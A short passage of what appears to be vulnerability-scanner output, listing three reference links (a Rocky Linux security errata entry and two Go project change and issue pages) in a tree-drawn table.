                         │      │                  ├ [6] : https://errata.rockylinux.org/RLSA-2026:38878 
                         │      │                  ├ [7] : https://go.dev/cl/797880 
                         │      │                  ├ [8] : https://go.dev/issue/79005 
